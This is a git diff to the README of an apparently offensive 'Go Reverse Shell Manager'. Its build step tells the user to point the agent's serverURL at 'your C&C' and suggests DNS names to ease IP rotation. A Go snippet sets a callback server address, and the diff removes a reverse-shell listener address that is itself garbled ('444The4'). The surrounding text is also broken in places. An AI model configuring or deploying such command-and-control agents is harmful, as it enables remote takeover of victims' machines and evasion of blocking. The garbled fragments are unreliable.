@@ -30,13 +30,12 @@ The Go Reverse Shell Manager is a comprehensive solution designed to facilitate 
 ```
 
 2. **Build the agent**
-Before building the agent you will need to replace in the code the serverUrl and listenerAddress with your endpoint configuration. The listernerAddress point to the adresss on your call back for your reverse shell and the serverURL is the endpoint of your C&C. You can use a dns name for both to faciliate ip rotation.
+Before building the agent you will need to replace in the code the serverUrl  with your endpoint configuration. TheserverURL is the endpoint of your C&C. You can use a dns name for both to faciliate ip rotation.
 ```go
 var (
     mu               sync.Mutex
     isCommandRunning bool
     serverURL        = "http://192.168.56.101:5000"
-    listenerAddress  = "192.168.56.101:444The4"
 )
 
 ```
